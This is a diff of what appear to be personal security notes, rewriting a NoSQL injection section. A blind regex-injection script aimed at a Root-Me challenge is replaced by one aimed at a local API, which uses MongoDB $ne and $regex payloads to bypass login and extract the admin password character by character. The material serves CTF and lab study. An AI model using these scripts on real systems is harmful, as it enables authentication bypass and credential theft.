@@ -81,29 +81,31 @@ for t in table.split(','):
 ### 2.3. Nosql injection
 ```
 import requests, string
-arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
 req = requests.session()
+arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
 
-def countchar() -> int:
-    for i in range(2,50):
-        res = req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=%s'%(i*'.')).text
-        if 'This is not a valid flag for the'  in res:    
-            return i 
+def blind(data):
+    for char in arr:
+        res = req.post('http://0.0.0.0/api/sqliMongo',json={'username':'admin','password':{"$regex": f"^{data}{char}"}}).json()
+        if res['data']:
+            return char
+    return None        
 
-def findpassword( n : int) -> str:
-    password = ''
-    for _ in range(n):
-        for c in arr:
-            if 'Yeah this is the flag for' in req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^' + password + c).text:
-                print('[+] ',password)
-                password += c
-                break
-    return password
+def dump_data():
+    data = '' 
+    while True:
+        char = blind(data)
+        if char == "$":
+            return data 
+        data += char 
+        print('[+] password: = ',data)
 
+def detect_sqli():
+    res = req.post('http://0.0.0.0/api/sqliMongo',json={'username': {"$ne" : 'a'},'password':  {"$ne" : 'a'} }).json()
+    print(res)
 
-n = countchar()
-print('length password ',n)
-print(findpassword(n))
+print('[+] password found : ',dump_data())
+
 ```
 ### 2.4. Tool sqlmap
 - install: `brew install sqlmap`
